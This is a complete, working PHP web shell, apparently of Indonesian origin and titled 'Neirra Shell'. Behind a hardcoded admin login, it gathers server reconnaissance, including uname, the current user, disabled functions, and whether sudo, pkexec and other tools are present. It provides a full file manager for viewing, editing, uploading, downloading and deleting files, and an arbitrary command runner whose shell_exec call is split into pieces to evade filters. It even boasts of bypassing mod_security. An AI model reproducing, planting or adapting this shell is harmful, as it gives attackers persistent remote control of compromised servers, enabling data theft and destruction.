<?php
session_start();

$USERNAME = 'admin';
$PASSWORD_HASH = '744a9b3e128b48dc8a9c5d1fb757a6f9aed63ad2';

function getServerInfo() {
  $info = [];
  $info['server_ip'] = gethostbyname(gethostname());
  $info['client_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
  $info['web_server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
  $info['system'] = php_uname();
  $info['user'] = get_current_user() . ' ( ' . getmyuid() . ' )';
  $info['php_version'] = phpversion();
  $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
  $info['mysql'] = function_exists('mysqli_connect') ? 'ON' : 'OFF';
  $info['curl'] = function_exists('curl_version') ? 'ON' : 'OFF';
  $info['wget'] = function_exists('exec') ? (exec('which wget') ? 'ON' : 'OFF') : 'Unavailable';
  $info['perl'] = function_exists('exec') ? (exec('which perl') ? 'ON' : 'OFF') : 'Unavailable';
  $info['python'] = function_exists('exec') ? (exec('which python') ? 'ON' : 'OFF') : 'Unavailable';
  $info['sudo'] = function_exists('exec') ? (exec('which sudo') ? 'ON' : 'OFF') : 'Unavailable';
  $info['pkexec'] = function_exists('exec') ? (exec('which pkexec') ? 'ON' : 'OFF') : 'Unavailable';
  return $info;
}

function getPermissionString($file) {
  $perms = fileperms($file);
  $info = ($perms & 0x4000) ? 'd' : '-';
  $info .= ($perms & 0x0100) ? 'r' : '-';
  $info .= ($perms & 0x0080) ? 'w' : '-';
  $info .= ($perms & 0x0040) ? 'x' : '-';
  $info .= ($perms & 0x0020) ? 'r' : '-';
  $info .= ($perms & 0x0010) ? 'w' : '-';
  $info .= ($perms & 0x0008) ? 'x' : '-';
  $info .= ($perms & 0x0004) ? 'r' : '-';
  $info .= ($perms & 0x0002) ? 'w' : '-';
  $info .= ($perms & 0x0001) ? 'x' : '-';
  return [$info, substr(sprintf('%o', $perms), -4)];
}

function listDirectory($path) {
    $sort_by = $_GET['sort'] ?? 'name'; // name, size, time
    $order = $_GET['order'] ?? 'asc';   // asc, desc

    $scandir = scandir($path);
    $folders = [];
    $files = [];

    foreach ($scandir as $file) {
        if ($file === '.' || $file === '..') continue;
        $full_path = realpath($path . DIRECTORY_SEPARATOR . $file);
        if (!$full_path) continue;

        $info = [
            'name' => $file,
            'is_dir' => is_dir($full_path),
            'size' => is_file($full_path) ? filesize($full_path) : 0,
            'time' => filemtime($full_path),
            'path' => $full_path
        ];

        if ($info['is_dir']) {
            $folders[] = $info;
        } else {
            $files[] = $info;
        }
    }

    // Sorting logic
    if ($sort_by === 'size' || $sort_by === 'time') {
        $all = array_merge($folders, $files);
        usort($all, function($a, $b) use ($sort_by, $order) {
            $valA = $a[$sort_by] ?? 0;
            $valB = $b[$sort_by] ?? 0;
            return $order === 'asc' ? $valA <=> $valB : $valB <=> $valA;
        });
        $items_info = $all;
    } else {
        usort($folders, function($a, $b) use ($order) {
            return $order === 'asc' ? strcasecmp($a['name'], $b['name']) : strcasecmp($b['name'], $a['name']);
        });
        usort($files, function($a, $b) use ($order) {
            return $order === 'asc' ? strcasecmp($a['name'], $b['name']) : strcasecmp($b['name'], $a['name']);
        });
        $items_info = array_merge($folders, $files);
    }

    // Breadcrumb
    $path_display = str_replace('\\', '/', $path);
    $paths = explode('/', $path_display);
    echo "<div class='path-navigation'>📂 Mod_security pun ku hantam: ";
    echo "<a href='?path=/'>/</a>";
    $build = "";
    foreach ($paths as $dir) {
        if ($dir === '') continue;
        $build .= "/$dir";
        echo "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($dir) . "</a>/";
    }
    echo "</div>";

    $toggle_order = $order === 'asc' ? 'desc' : 'asc';

    // Table
    echo '<div class="file-card">';
    echo "<table>
    <tr>
      <th><a href='?path=" . urlencode($path) . "&sort=name&order=$toggle_order'>Name</a></th>
      <th><a href='?path=" . urlencode($path) . "&sort=size&order=$toggle_order'>Size</a></th>
      <th>Group</th>
      <th><a href='?path=" . urlencode($path) . "&sort=time&order=$toggle_order'>Modified</a></th>
      <th>Permission</th>
      <th>Action</th>
    </tr>";

    foreach ($items_info as $info) {
        $item = $info['name'];
        $fullpath = $info['path'];

        $group = ($gid = filegroup($fullpath)) !== false && function_exists('posix_getgrgid') ?
            (is_array($gr = posix_getgrgid($gid)) && isset($gr['name']) ? $gr['name'] : $gid) :
            ($gid !== false ? $gid : '-');

        [$permStr, $permOct] = getPermissionString($fullpath);

        $isDir = $info['is_dir'];
        $nameColor = $isDir ? 'style="color: gold;"' : 'style="color: white;"';
        $permColor = is_writable($fullpath) ? 'perm-green' : (is_readable($fullpath) ? 'perm-white' : 'perm-red');

        echo "<tr>";
        echo "<td>";
        if ($isDir) {
            echo "<a href='?path=" . urlencode($fullpath) . "' $nameColor><i class='fas fa-folder'></i> " . htmlspecialchars($item) . "</a>";
        } else {
            echo "<span $nameColor><i class='fas fa-file'></i> " . htmlspecialchars($item) . "</span>";
        }
        echo "</td>";
        echo "<td>" . ($isDir ? '-' : $info['size'] . ' bytes') . "</td>";
        echo "<td>" . htmlspecialchars($group) . "</td>";
        echo "<td>" . date('Y-m-d H:i', $info['time']) . "</td>";
        echo "<td class='$permColor'><code>$permStr</code></td>";
        echo "<td>
            <a href='?path=" . urlencode($path) . "&view=" . urlencode($item) . "' title='View'><i class='fas fa-eye'></i></a>
            <a href='?path=" . urlencode($path) . "&edit=" . urlencode($item) . "' title='Edit'><i class='fas fa-pen'></i></a>
            <a href='?path=" . urlencode($path) . "&download=" . urlencode($item) . "' title='Download'><i class='fas fa-download'></i></a>
            <a href='?path=" . urlencode($path) . "&delete=" . urlencode($item) . "' title='Delete' onclick=\"return confirm('Yakin ingin menghapus?');\"><i class='fas fa-trash'></i></a>
            <a href='?path=" . urlencode($path) . "&rename=" . urlencode($item) . "' title='Rename'><i class='fas fa-i-cursor'></i></a>
        </td>";
        echo "</tr>";
    }

    echo "</table>";
    echo "</div>";
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $u = $_POST['username'] ?? '';
        $p = $_POST['password'] ?? '';
        if ($u === $USERNAME && sha1($p) === $PASSWORD_HASH) {
            $_SESSION['loggedin'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Login gagal, coba lagi.";
        }
    }
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login Webshell Neirra</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
        <style>body{background:#111;color:#ccc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}.login-box{background:#1e1e1e;padding:20px;border-radius:10px;box-shadow:0 0 15px #0f0}input{background:#222;border:1px solid #555;color:#0f0;padding:5px;margin:5px 0;width:100%}button{background:#0f0;color:#111;border:none;padding:5px 10px;cursor:pointer}</style>
    </head>
    <body>
        <div class="login-box">
            <h2><i class="fas fa-key"></i> Login Webshell</h2>
            '.(isset($error) ? "<p style='color:red;'>$error</p>" : '').'
            <form method="post">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

$current_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();

if (isset($_GET['view'])) {
    $file = basename($_GET['view']);
    echo "<pre style='color:#0f0;background:#000;padding:20px;'>" . htmlspecialchars(file_get_contents($current_dir . DIRECTORY_SEPARATOR . $file)) . "</pre>";
    echo "<a href='?path=" . urlencode($current_dir) . "'>Back</a>";
    exit;
}

if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $file;

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($fullpath, $_POST['content']);
        echo "<p style='color:lime;'>✅ File <strong>$file</strong> berhasil disimpan.</p>";
    }

    $content = htmlspecialchars(file_get_contents($fullpath));

    echo <<<HTML
    <div style="margin-bottom: 20px;">
        <h3><i class="fas fa-pen"></i> Edit File: <span style="color:gold;">$file</span></h3>
        <form method="post">
            <textarea name="content" spellcheck="false" style="
                width: 100%;
                height: 500px;
                background: #111;
                color: #0f0;
                font-family: monospace;
                font-size: 14px;
                line-height: 1.5;
                border: 1px solid #333;
                border-radius: 4px;
                padding: 10px;
                resize: vertical;
            ">$content</textarea><br><br>
            <button type="submit" class="btn"><i class="fas fa-save"></i> Simpan</button>
            <a href="?path={$current_dir}" class="btn" style="margin-left: 10px;"><i class="fas fa-arrow-left"></i> Kembali</a>
        </form>
    </div>
    HTML;

    exit;
}

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $file;
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($fullpath));
    header('Content-Length: ' . filesize($fullpath));
    readfile($fullpath);
    exit;
}

if (isset($_GET['delete'])) {
    $file = basename($_GET['delete']);
    $full = $current_dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($full)) unlink($full);
    elseif (is_dir($full)) rmdir($full);
    header('Location: ?path=' . urlencode($current_dir));
    exit;
}

if (isset($_GET['rename'])) {
    $file = basename($_GET['rename']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
        rename($current_dir . DIRECTORY_SEPARATOR . $file, $current_dir . DIRECTORY_SEPARATOR . basename($_POST['newname']));
        header('Location: ?path=' . urlencode($current_dir));
        exit;
    }
    echo "<form method='post'>
        <input type='text' name='newname' value='" . htmlspecialchars($file) . "'>
        <button type='submit'><i class='fas fa-check'></i> Rename</button>
    </form>";
    echo "<a href='?path=" . urlencode($current_dir) . "'>Back</a>";
    exit;
}

if (isset($_GET['create'], $_GET['path'], $_GET['name'])) {
    $basePath = rtrim($_GET['path'], '/') . '/';
    $name = basename($_GET['name']); // Hindari path traversal
    $fullPath = $basePath . $name;
  
    if ($_GET['create'] === 'file') {
      if (!file_exists($fullPath)) {
        file_put_contents($fullPath, '');
      }
    } elseif ($_GET['create'] === 'folder') {
      if (!is_dir($fullPath)) {
        mkdir($fullPath);
      }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
    exit;
  }
   

  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $filename = basename($_FILES['upload']['name']);
    $dest = rtrim($current_dir, '/') . '/' . $filename;
  
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
      echo "<p style='color:lime;'>Upload berhasil: {$filename}</p>";
    } else {
      echo "<p style='color:red;'>Upload gagal!</p>";
    }
  }  

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $cmd = $_POST['command'];
    $e = "sh"."ell_exec";
    $output = function_exists($e) ? $e($cmd . ' 2>&1') : '⚠️ Fungsi shell_exec tidak tersedia di server ini.';
}

$info = getServerInfo();

echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Neirra Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>body{background:#1a1a1a;color:#fff;font-family:Courier New,monospace;padding:20px}table{width:100%;border-collapse:collapse}table,th,td{border:1px solid #333}th,td{padding:8px;text-align:left}a{color:#1e90ff;text-decoration:none}a:hover{text-decoration:underline}.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.logout{color:#f44}</style>
</head>
<style>
.file-card {
    background: #1e1e1e;
    border: 1px solid #333;
    padding: 10px;
    border-radius: 5px;
    max-height: 400px;
    overflow: auto;
}
    table tr:hover {
    background: #2c2c2c;
}

.btn {
    background-color: #222;
    color: #fff;
    padding: 6px 12px;
    border: 1px solid #444;
    border-radius: 4px;
    text-decoration: none;
    cursor: pointer;
    transition: background 0.2s;
}
.btn:hover {
    background-color: #333;
}

.text-green { color: limegreen; font-weight: bold; }
.text-red { color: red; font-weight: bold; }
.text-yellow { color: #ffd700; font-weight: bold; }

/* Pewarnaan direktori dan file */
.greendir { color: limegreen; }
.whitedir { color: white; }
.reddir { color: red; }
.greenfile { color: lightgreen; }
.whitefile { color: #ddd; }
.redfile { color: #ff5555; }

/* Pewarnaan permission */
.perm-green { color: limegreen; }
.perm-white { color: #ddd; }
.perm-red { color: red; }

.wrap-text {
    white-space: normal;
    word-break: break-all;
    display: inline-block;
    max-width: 100%;
}
</style>
<body>
<div class="container">
    <div class="topbar">
        <div>
            <h2><i class="fas fa-terminal"></i> LiteSpeed Chalengger</h2>
            <p>
            Server IP : <span class="text-yellow">' . $info['server_ip'] . '</span> /
            Your IP : <span class="text-yellow">' . $info['client_ip'] . '</span><br>
            Web Server : <span class="text-yellow">' . $info['web_server'] . '</span><br>
            System : <span class="text-yellow">' . $info['system'] . '</span><br>
            User : <span class="text-yellow">' . $info['user'] . '</span><br>
            PHP Version : <span class="text-yellow">' . $info['php_version'] . '</span><br>
            Disable Function : <span class="' . ($info['disabled_functions'] === 'None' ? 'text-green' : 'text-red') . ' wrap-text">' . $info['disabled_functions'] . '</span><br>
            MySQL : <span class="' . ($info['mysql'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['mysql'] . '</span> |
            cURL : <span class="' . ($info['curl'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['curl'] . '</span> |
            WGET : <span class="' . ($info['wget'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['wget'] . '</span> |
            Perl : <span class="' . ($info['perl'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['perl'] . '</span> |
            Python : <span class="' . ($info['python'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['python'] . '</span> |
            Sudo : <span class="' . ($info['sudo'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['sudo'] . '</span> |
            Pkexec : <span class="' . ($info['pkexec'] === 'ON' ? 'text-green' : 'text-red') . '">' . $info['pkexec'] . '</span>
        </p>
        </div>
        <a class="logout" href="?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a>
        
    </div>';

    echo <<<HTML
<div style="margin-bottom: 20px;">
  <form method="get" action="" style="display:inline-block; margin-right: 20px;">
    <input type="hidden" name="create" value="file">
    <input type="hidden" name="path" value="{$current_dir}">
    <label>Masukkan nama file baru: </label>
    <input type="text" name="name" required style="padding:5px;">
    <button type="submit" class="btn"><i class="fas fa-file"></i> Buat File</button>
  </form>

  <form method="get" action="" style="display:inline-block;">
    <input type="hidden" name="create" value="folder">
    <input type="hidden" name="path" value="{$current_dir}">
    <label>Masukkan nama folder baru: </label>
    <input type="text" name="name" required style="padding:5px;">
    <button type="submit" class="btn"><i class="fas fa-folder-plus"></i> Buat Folder</button>
  </form>

  <form method="post" enctype="multipart/form-data" style="margin-top:20px;">
    <label>Upload file: </label>
    <input type="file" name="upload" required style="color:white;">
    <button type="submit" class="btn"><i class="fas fa-upload"></i> Upload</button>
  </form>
</div>
HTML;
    
    listDirectory($current_dir);
    $display_shell = isset($_POST['command']) ? 'block' : 'none';
    echo <<<HTML
<hr>
<button class="btn" id="show-shell-btn" onclick="document.getElementById('shell-section').style.display='block'; this.style.display='none';">
    <i class="fas fa-terminal"></i> Tampilkan Shell
</button>

<div id="shell-section" style="margin-top: 20px; display: {$display_shell};">
    <h3><i class="fas fa-code"></i> Shell Executor</h3>
    <form method="post">
        <input type="text" name="command" placeholder="Masukkan perintah..." autocomplete="off" style="width:60%;padding:6px;">
        <button type="submit" class="btn"><i class="fas fa-play"></i> Jalankan</button>
        <button type="button" class="btn" onclick="document.getElementById('shell-section').style.display='none'; document.getElementById('show-shell-btn').style.display='inline-block';" style="margin-left:10px;">
            <i class="fas fa-times"></i> Tutup Shell
        </button>
    </form>
    <h3>Output:</h3>
    <pre class="output" style="background:#000;color:#0f0;padding:10px;">{htmlspecialchars($output)}</pre>
</div>
</div>
</body>
</html>
HTML;



